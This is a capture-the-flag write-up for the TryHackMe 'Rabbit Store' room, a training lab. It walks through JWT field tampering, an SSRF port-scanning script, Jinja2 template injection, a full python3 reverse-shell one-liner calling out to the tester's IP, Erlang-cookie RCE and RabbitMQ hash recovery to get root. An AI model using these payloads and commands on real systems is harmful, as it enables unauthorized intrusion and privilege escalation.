## Description

This is a Write-Up to the TryHackMe challenge Rabbit Store, which is rated as Medium. You can visit the room [here](https://tryhackme.com/room/rabbitstore).
> Wait for 5 min after clicking the start machine button.
>
> Note: For free users, it is recommended to use your own VM or system because some website components require internet access to fetch certain files.

Note: For me it happened 3 times that the machine crashed somehow, restart it if that happens.

## Initial scanning

As always I started with an `nmap` scan. 

```
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://cloudsite.thm/
|_http-server-header: Apache/2.4.52 (Ubuntu)
4369/tcp  open  epmd    syn-ack ttl 63 Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    rabbit: 25672
25672/tcp open  unknown syn-ack ttl 63
```

We have three ports open, the first one is SSH, the second a webserver, and the last one a Erlang port mapper. Erlang is a programming language for real time applications and the port `25672` is a port of the RabbitMQ broker.

The webserver on port 80 redirects us to `cloudsite.thm`, we need to add that to our hosts file.

```terminal
sudo sh -c 'echo "10.10.247.179 cloudsite.thm" >> /etc/hosts'
```

If you open the web page you are presented with a template page for a cloud provider.

![](/assets/blog/Rabbit-Store/page.png)

By clicking *Sign Up*, you are redirected to `storage.cloudsite.thm`, add that to your host file too.
```terminal
sudo sh -c 'echo "10.10.247.179 storage.cloudsite.thm" >> /etc/hosts'
```

On that page you can create an account on that cloud service.

![](/assets/blog/Rabbit-Store/create.png)

If you create an account and then sign into that account, you see this page.

![](/assets/blog/Rabbit-Store/inactive.png)

We can't use the services because we don't have a subscription. In the URL you see `/dashboard/inactive`, if you try to access `/dashboard/active`, you will see this page.

![](/assets/blog/Rabbit-Store/sub.png)

You can now check what is saved in your cookie by copying the cookie to [jwt.io](https://jwt.io/) or some other site to analyze it. The data saved in the cookie includes the subscription type, currently it is set to `inactive`:
```json
{
  "email": "i@mail.com",
  "subscription": "inactive",
  "iat": 1740306601,
  "exp": 1740310201
}
```

My idea was to set the subscription when we are logging in. I simply submitted the `subscription` parameter besides the email and the password.

```
POST /api/register HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Content-Type: application/json
Content-Length: 70
Origin: http://storage.cloudsite.thm
Priority: u=0

{
  "email":"new@mail.com",
  "password":"123",
  "subscription": "active"
}
```

The response of the server looks promising, it returns that the registration was successful.

![](/assets/blog/Rabbit-Store/req.png)

If we log back in we are presented with a new site, our URL also changed.

## SSRF

![](/assets/blog/Rabbit-Store/active.png)

If you try to upload any file it is uploaded with a random name and no extension to `/api/uploads`.

![](/assets/blog/Rabbit-Store/file.png)

The upload from URL function sounds like a typical SSRF vulnerability. I tried connecting back to myself.

```terminal
$ nc -lvnp 9001  
listening on [any] 9001 ...
connect to [10.14.78.229] from (UNKNOWN) [10.10.247.179] 40534
GET / HTTP/1.1
Accept: */*
User-Agent: node-fetch/1.0 (+https://github.com/bitinn/node-fetch)
Accept-Encoding: gzip,deflate
Host: 10.14.78.229:9001
Connection: close
```

We see, the server uses `node-fetch`, to connect back to us, this SSRF by itself can not be leveraged, because `node-fetch` only accepts `http` and `https` requests. Although the limitations, we can use this SSRF as a port scanner for internal ports of the server.

I made this small program to check each port.
```python
import requests
import sys
from concurrent.futures import ThreadPoolExecutor

url = "http://storage.cloudsite.thm/api/store-url"
cookies = {
    "jwt": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQG1haWwuY29tIiwic3Vic2NyaXB0aW9uIjoiYWN0aXZlIiwiaWF0IjoxNzQwMjM4MzgwLCJleHAiOjE3NDAyNDE5ODB9.-y0m1w6kLPyRi5XsJp9_AcKGm4r7Hm_RPyikShziqeE"
}

def fuzz_dir(fuzz):
    data = {"url": f"http://127.0.0.1:{fuzz}/"}
    response = requests.post(url, json=data, cookies=cookies)
    
    if response.status_code == 200:
        try:
            json_response = response.json()
            print(f"[+] Open port fond: {fuzz}")
        except Exception as e:
            print(f"[-] Error parsing response: {e}")
    else:
        if response.status_code == 500:
            pass
        else:
            print(f"[-] Request failed with status {response.status_code}")

def fuzz_dirs(wordlist, max_threads=5):
    with open(wordlist, "r") as f, ThreadPoolExecutor(max_threads) as executor:
        executor.map(fuzz_dir, (line.strip() for line in f))

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <wordlist>")
        sys.exit(1)
    
    wordlist_path = sys.argv[1]
    fuzz_dirs(wordlist_path)
```
{: file='port_scanner.py'}

You can generate a sequence of all ports with this one-liner:
```terminal
seq 0 65537 > ports.txt
```

**Note:** Don't forget to replace the JWT with the JWT from your cookies. This script can take a while (I don't want to overload the server).
```
$ python3 port_scanner.py ports.txt
[+] Open port fond: 80
[+] Open port fond: 3000
[+] Open port fond: 8000
[+] Open port fond: 15672
```

Now I continued checking the content of each port. Port 80 as expected contains the web app.

![](/assets/blog/Rabbit-Store/3000.png)

On port 3000 there is an Express server running, you can check what type of application it is by going to [this](https://0xdf.gitlab.io/cheatsheets/404#) site which shows you the default error pages of common web frameworks. 


Port 8000 contains a Flask application:

```html
<!doctype html>
<html lang=en>
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
```

And the port 15672 the management dashboard for the RabbitMQ broker, we touched earlier.

![](/assets/blog/Rabbit-Store/random.png)

The next thing I did is checking the storage server again, specifically the API endpoint, cause I didn't find anything when brute forcing directories on the internal servers.

```terminal
$ gobuster dir -u http://storage.cloudsite.thm/api/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
===============================================================  
/login                (Status: 405) [Size: 36]
/register             (Status: 405) [Size: 36]
/uploads              (Status: 401) [Size: 32]
/docs                 (Status: 403) [Size: 27]
/Login                (Status: 405) [Size: 36]
===============================================================
```

The `/docs` API is new, if you access it with the `active` subscription, you won't get anything.

```json
{"message":"Access denied"}
```

I now tried accessing this `/docs` API on the internal Express server.

![](/assets/blog/Rabbit-Store/docs.png)

There is a new endpoint we didn't see before the `/api/fetch_messeges_from_chatbot` endpoint.

## SSTI

If you try to access the endpoint with a POST request in Burp, the server will tell you you need a `username` parameter.
The response from the server looks like a template that is being rendered:
```html
<!DOCTYPE html>
<html lang="en">
 <head>
   <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Greeting</title>
 </head>
 <body>
   <h1>Sorry, test, our chatbot server is currently under development.</h1>
 </body>
</html>
```

I now tried server side template injection.With the typical {\{9*9}} payload.
The response looks promising:
```
  <h1>Sorry, 81, our chatbot server is currently under development.</h1>
```

If you enter some broken code you will find out that this application uses Jinja2 and Python?!. To inject a reverse shell you can use this payload, I copied the `python3#1` reverse shell from revshells.com.

Note: I added in front of the 
```
POST /api/fetch_messeges_from_chatbot HTTP/1.1

```

![](/assets/blog/Rabbit-Store/rev.png)

I [stabilized](https://saeed0x1.medium.com/stabilizing-a-reverse-shell-for-interactive-access-a-step-by-step-guide-c5c32f0cb839) the shell and got `user.txt`.

```terminal
azrael@forge:~$ ls
chatbotServer  snap  user.txt
azrael@forge:~$ wc user.txt 
 1  1 33 user.txt
```

## Privilege Escalation

The next thing I checked was the home directory of `rabbitmq`, the broker system, with the exposed port. 
```terminal
azrael@forge:/var/lib/rabbitmq$ ls -la
total 896
drwxr-xr-x  5 rabbitmq rabbitmq   4096 Sep 12 00:32 .
drwxr-xr-x 45 root     root       4096 Sep 20 19:11 ..
drwxr-x---  3 rabbitmq rabbitmq   4096 Aug 15  2024 config
-r-----r--  1 rabbitmq rabbitmq     16 Feb 23 11:11 .erlang.cookie
-rw-r-----  1 rabbitmq rabbitmq 889381 Feb 23 11:11 erl_crash.dump
drwxr-x---  4 rabbitmq rabbitmq   4096 Feb 23 11:11 mnesia
-rw-r-----  1 rabbitmq rabbitmq      0 Sep 12 00:33 nc
drwxr-x---  2 rabbitmq rabbitmq   4096 Jul 18  2024 schema
```

You can see that the `.erlang.cookie` is readable to us, which is a strong indicator that we have RCE as that user and can escalate our privileges.

**What is RabbitMQ:** RabbitMQ per website: "RabbitMQ is a reliable and mature messaging and streaming broker, which is easy to deploy on cloud environments, on-premises, and on your local machine."

```terminal
azrael@forge:/var/lib/rabbitmq$ cat .erlang.cookie && echo
HIDDENCOOKIE
```

I now used [`erl-matter`](https://github.com/gteissier/erl-matter) repo to get RCE.
You can use the cookie and get a shell, but only execute one command to get a decent reverse shell, because the program crashed immediately for me.
```terminal
$ python2 shell-erldp.py 10.10.227.32 25672 HIDDENCOOKIE
[*] authenticated onto victim
10.10.227.32:25672 $ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.78.229",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

You will now get a shell as RabbitMQ.
```terminal
$ nc -lvnp 9002
listening on [any] 9002 ...
connect to [10.14.78.229] from (UNKNOWN) [10.10.227.32] 52932
$ whoami
whoami
rabbitmq
```

With that you can now use the `rabbitmqctl` command to list the broker data.
I added a new user and set all privileges to do anything. Before that set the privileges for the cookie right, if you don't the command won't work.
```terminal
rabbitmq@forge:~$ chmod 600 .erlang.cookie 
rabbitmq@forge:~$ rabbitmqctl add_user imposter 123
Adding user "imposter" ...
Done. Don't forget to grant the user permissions to some virtual hosts! See 'rabbitmqctl help set_permissions' to learn more.
rabbitmq@forge:~$ rabbitmqctl set_user_tags imposter administrator
Setting tags for user "imposter" to [administrator] ...
```

You can now use the internal API of the RabbitMQ management server on port 15672 to get some information.
```terminal
rabbitmq@forge:~$ curl -u "imposter:123" localhost:port http://localhost:15672/api/users                                                                                                               
curl: (3) URL using bad/illegal format or missing URL                                                                                                                                                         
[{"name":"The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.","password_hash":"vyf4qvKLpShONYgEiNc6xT/5rLq+23A2RuuhEZ8N10kyN34K","hashing_algorithm":"rabbit_password_hashing_sha256","tags":[],"limits":{}},{"name":"imposter","password_hash":"y+k4c/x1Oi/ftAaMPZ3tUAUldbnhpCpOJcb/1EOYe+j4M1Zp","hashing_algorithm":"rabbit_password_hashing_sha256","tags":["administrator"],"limits":{}},{"name":"root","password_hash":"THISISNOTTHEREALHASH","hashing_algorithm":"rabbit_password_hashing_sha256","tags":["administrator"],"limits":{}}]
```

This is the user list in a more readable format, the list includes the password in a base64 hashed format.
```json
[
  {
    "name": "The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.",
    "password_hash": "vyf4qvKLpShONYgEiNc6xT/5rLq+23A2RuuhEZ8N10kyN34K",
    "hashing_algorithm": "rabbit_password_hashing_sha256",
    "tags": [],
    "limits": {}
  },
  {
    "name": "imposter",
    "password_hash": "y+k4c/x1Oi/ftAaMPZ3tUAUldbnhpCpOJcb/1EOYe+j4M1Zp",
    "hashing_algorithm": "rabbit_password_hashing_sha256",
    "tags": [
      "administrator"
    ],
    "limits": {}
  },
  {
    "name": "root",
    "password_hash": "THISISNOTTHEREALHASH",
    "hashing_algorithm": "rabbit_password_hashing_sha256",
    "tags": [
      "administrator"
    ],
    "limits": {}
  }
]
```

I googled a little bit and found [this GitHub issue](https://github.com/QKaiser/cottontail/issues/27), which shows us how we can convert the hash back to a normal SHA256 format.

```terminal
echo 'hashhashhashhashhashhashhashhashhashhashhash' | base64 -d | xxd -pr -c128 | cut -c9-
```

Now you can use the output to log into root.

```terminal
root@forge:~# wc root.txt 
 1  1 33 root.txt
```
Although I struggled at first doing this room, I really liked the different stages.
